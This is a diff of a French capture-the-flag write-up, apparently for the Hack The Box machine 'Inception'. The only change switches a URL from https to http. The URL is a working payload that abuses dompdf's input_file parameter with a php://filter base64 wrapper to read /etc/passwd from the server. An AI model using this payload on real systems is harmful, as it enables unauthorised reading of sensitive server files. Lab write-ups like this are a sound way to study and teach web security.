@@ -105,7 +105,7 @@ En utilisant les **PHP Wrappers**, il est possible de contourner la protection "
 
 J'ai tout d'abord essayé de récupérer le fichier /etc/passwd :
 
-`https://inception.htb/dompdf/dompdf.php?input_file=php://filter/read=convert.base64-encode/resource=/etc/passwd`
+`http://inception.htb/dompdf/dompdf.php?input_file=php://filter/read=convert.base64-encode/resource=/etc/passwd`
 
 Un fichier PDF est généré et celui ci contient le contenu du fichier demandé en base64. Il suffit de déchiffrer cette chaine :
 
